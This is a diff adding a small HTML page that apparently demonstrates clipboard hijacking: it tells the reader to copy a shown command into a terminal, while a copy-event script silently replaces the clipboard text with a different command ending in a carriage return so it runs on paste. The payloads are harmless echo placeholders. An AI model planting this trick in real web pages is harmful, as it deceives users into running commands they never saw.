@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+    <body>
+        Copy the text below and run it in your terminal for totally not evil things to happen.
+        </br>
+
+        <p>echo "not evil"</p>
+        <script>
+            document.addEventListener('copy', function(e){
+                console.log(e);
+                e.clipboardData.setData('text/plain', 'echo "evil"\r\n');
+                e.preventDefault(); // We want our data, not data from any selection, to be written to the clipboard
+            });
+        </script>
+    </body>
+</html>
